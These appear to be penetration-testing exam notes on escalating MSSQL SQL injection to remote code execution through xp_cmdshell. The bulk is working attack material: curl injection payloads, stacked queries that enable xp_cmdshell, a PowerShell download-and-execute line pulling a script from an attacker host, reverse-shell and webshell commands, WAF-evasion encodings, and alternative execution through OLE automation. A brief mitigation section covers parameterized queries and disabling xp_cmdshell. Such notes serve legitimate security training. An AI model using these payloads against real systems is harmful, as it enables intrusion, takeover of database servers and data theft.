# MSSQL SQL Injection to xp_cmdshell RCE PoC Notes

## Vulnerability Summary
- **Target**: ASP.NET/MSSQL web applications with SQL injection
- **CVE**: N/A (Common vulnerability pattern)
- **Type**: SQL Injection → xp_cmdshell → Remote Code Execution
- **Impact**: Unauthenticated remote code execution as SQL Server service account

## Vulnerability Details

### Attack Chain
1. **Identify SQLi**: Find SQL injection in web application parameter
2. **Confirm MSSQL**: Use time-based detection (WAITFOR DELAY) or error messages
3. **Check Privileges**: Verify current user has sysadmin role
4. **Enable xp_cmdshell**: Use stacked queries to enable xp_cmdshell
5. **Execute Commands**: Run OS commands via xp_cmdshell
6. **Achieve RCE**: Ping callback, reverse shell, or webshell write

### Root Cause
Vulnerable code fails to properly sanitize user input before including it in SQL queries, allowing attackers to inject arbitrary SQL. When combined with sysadmin privileges and xp_cmdshell, this leads to OS command execution.

**Vulnerable Code Pattern (ASP.NET)**:
```csharp
// VULNERABLE - String concatenation
string query = "SELECT * FROM Products WHERE ID = '" + Request["id"] + "'";
SqlCommand cmd = new SqlCommand(query, connection);
SqlDataReader reader = cmd.ExecuteReader();
```

**xp_cmdshell Overview**:
```sql
-- Disabled by default in MSSQL 2005+
-- Requires sysadmin privileges to enable
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami';
```

## Lab Setup

### Prerequisites
- Windows Server with MSSQL Express
- Vulnerable ASP.NET application
- SQL Server Management Studio (SSMS)
- Burp Suite or proxy

### Option 1: Windows VM with MSSQL
```powershell
# Download SQL Server 2019 Express
# https://www.microsoft.com/en-us/sql-server/sql-server-downloads

# Install with default options
# Enable TCP/IP in SQL Server Configuration Manager

# Create vulnerable ASP.NET app
# See example code in Notes.md
```

### Option 2: Docker MSSQL (Linux)
```bash
# Pull MSSQL Server for Linux
docker pull mcr.microsoft.com/mssql/server:2019-latest

# Run container
docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=YourStrong@Passw0rd" \
  -p 1433:1433 --name mssql2019 \
  -d mcr.microsoft.com/mssql/server:2019-latest

# Connect with sqlcmd
sqlcmd -S localhost -U SA -P 'YourStrong@Passw0rd'
```

### Vulnerable Application Example
```csharp
// VulnerableProduct.aspx.cs
protected void Page_Load(object sender, EventArgs e)
{
    string productId = Request.QueryString["id"];

    // VULNERABLE: No input validation
    string query = "SELECT * FROM Products WHERE ID = " + productId;

    using (SqlConnection conn = new SqlConnection(connString))
    {
        SqlCommand cmd = new SqlCommand(query, conn);
        conn.Open();
        SqlDataReader reader = cmd.ExecuteReader();
        // ... display results
    }
}
```

## Exploit Chain

### Stage 1: Identify SQL Injection
```bash
# Test basic SQLi
curl "http://target/product.aspx?id=1'"
# Look for: "Unclosed quotation mark", "Incorrect syntax near"

# Test time-based SQLi
curl "http://target/product.aspx?id=1'; WAITFOR DELAY '00:00:05'--"
# If response takes ~5 seconds, SQLi confirmed

# Test UNION-based SQLi
curl "http://target/product.aspx?id=1 UNION SELECT NULL,NULL,NULL--"
```

### Stage 2: Confirm MSSQL and Check Privileges
```bash
# Detect MSSQL version
curl "http://target/product.aspx?id=1'; SELECT @@VERSION--"

# Check if sysadmin (time-based)
curl "http://target/product.aspx?id=1'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '00:00:05'--"
# If delay occurs, user is sysadmin

# Check current user
curl "http://target/product.aspx?id=1' UNION SELECT USER_NAME(),NULL,NULL--"
```

### Stage 3: Enable xp_cmdshell
```bash
# Execute stacked queries to enable xp_cmdshell
curl "http://target/product.aspx?id=1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--"
curl "http://target/product.aspx?id=1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--"

# Verify xp_cmdshell enabled
curl "http://target/product.aspx?id=1'; EXEC xp_cmdshell 'whoami'--"
```

### Stage 4: Execute Commands
```bash
# Ping callback
curl "http://target/product.aspx?id=1'; EXEC xp_cmdshell 'ping -n 4 10.10.14.5'--"

# Write file
curl "http://target/product.aspx?id=1'; EXEC xp_cmdshell 'echo test > C:\temp\test.txt'--"

# PowerShell download and execute
curl "http://target/product.aspx?id=1'; EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/shell.ps1\")'--"
```

## Testing Commands

### Basic PoC Usage
```bash
cd poc-examples/mssql-sqli-xp-cmdshell

# Basic ping test
python3 poc.py 192.168.1.10 80 10.10.14.5 4444

# Reverse shell
python3 poc.py 192.168.1.10 80 10.10.14.5 4444 --command reverse_shell

# Write webshell
python3 poc.py 192.168.1.10 80 10.10.14.5 4444 \\
  --command webshell --webshell-path "C:\\inetpub\\wwwroot\\shell.aspx"

# Custom endpoint
python3 poc.py 192.168.1.10 80 10.10.14.5 4444 \\
  --endpoint /search.aspx --param-name query
```

### Manual Verification
```bash
# Monitor for ping
sudo tcpdump -i eth0 icmp and src 192.168.1.10

# Listen for reverse shell
nc -lvnp 4444

# Test webshell
curl "http://192.168.1.10/shell.aspx?c=whoami"
```

## Bypass Techniques

### Escaping WAF Filters
```sql
-- URL encoding
%27;%20EXEC%20xp_cmdshell%20%27whoami%27--

-- Case variation
'; eXeC xP_cMdShElL 'whoami'--

-- Comment obfuscation
'; EXEC/*comment*/xp_cmdshell/**/'whoami'--

-- Whitespace alternatives
';EXEC%09xp_cmdshell%09'whoami'--
```

### Alternative RCE Methods
```sql
-- OLE Automation (if xp_cmdshell blocked)
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE--
'; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'calc.exe'--

-- Write file via bulk insert
'; BULK INSERT tmp FROM '\\10.10.14.5\share\shell.aspx' WITH (CODEPAGE='RAW')--
```

## Debugging

### Common Issues
1. **"xp_cmdshell is disabled"** - Need sysadmin to enable
2. **No output visible** - xp_cmdshell output requires UNION or out-of-band
3. **Firewall blocking callbacks** - Use DNS/HTTP instead of ICMP
4. **Insufficient privileges** - Current user not sysadmin

### Diagnostic Commands
```sql
-- Check if xp_cmdshell enabled
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'

-- Check current privileges
SELECT IS_SRVROLEMEMBER('sysadmin')

-- List all databases
SELECT name FROM sys.databases

-- Check SQL Server version
SELECT @@VERSION
```

## Mitigation

### Developer Fixes
```csharp
// GOOD: Parameterized queries
string query = "SELECT * FROM Products WHERE ID = @id";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@id", Request["id"]);

// GOOD: Stored procedures with parameters
SqlCommand cmd = new SqlCommand("GetProductByID", connection);
cmd.CommandType = CommandType.StoredProcedure;
cmd.Parameters.AddWithValue("@ProductID", Request["id"]);
```

### Server Configuration
```sql
-- Disable xp_cmdshell when not needed
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Remove unnecessary privileges
-- Don't run SQL Server as SYSTEM or Administrator
-- Use least-privilege service accounts
```

## OSWE Exam Notes

### Key Takeaways
- MSSQL SQLi to RCE requires sysadmin privileges
- Use WAITFOR DELAY for time-based detection (5 seconds is good default)
- xp_cmdshell disabled by default - must enable via stacked queries
- Ping callbacks work well for verification
- PowerShell reverse shells are reliable on Windows targets

### Time Management
- **Recon + SQLi detection**: 10 minutes
- **Privilege check**: 5 minutes
- **Enable xp_cmdshell**: 5 minutes
- **Command execution**: 10 minutes
- **Verification**: 5 minutes
- **Total**: 35 minutes

### Pre-Exam Checklist
- [ ] Understand stacked query syntax for MSSQL
- [ ] Know xp_cmdshell enable sequence by heart
- [ ] Have PowerShell reverse shell encoded and ready
- [ ] Familiar with time-based SQLi detection
- [ ] Know how to check sysadmin privileges

### Quick Reference
```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- Execute command
'; EXEC xp_cmdshell 'ping -n 4 ATTACKER_IP'--

-- PowerShell reverse shell
'; EXEC xp_cmdshell 'powershell -EncodedCommand <BASE64>'--
```

## References
- xp_cmdshell Documentation: https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- HackTricks MSSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
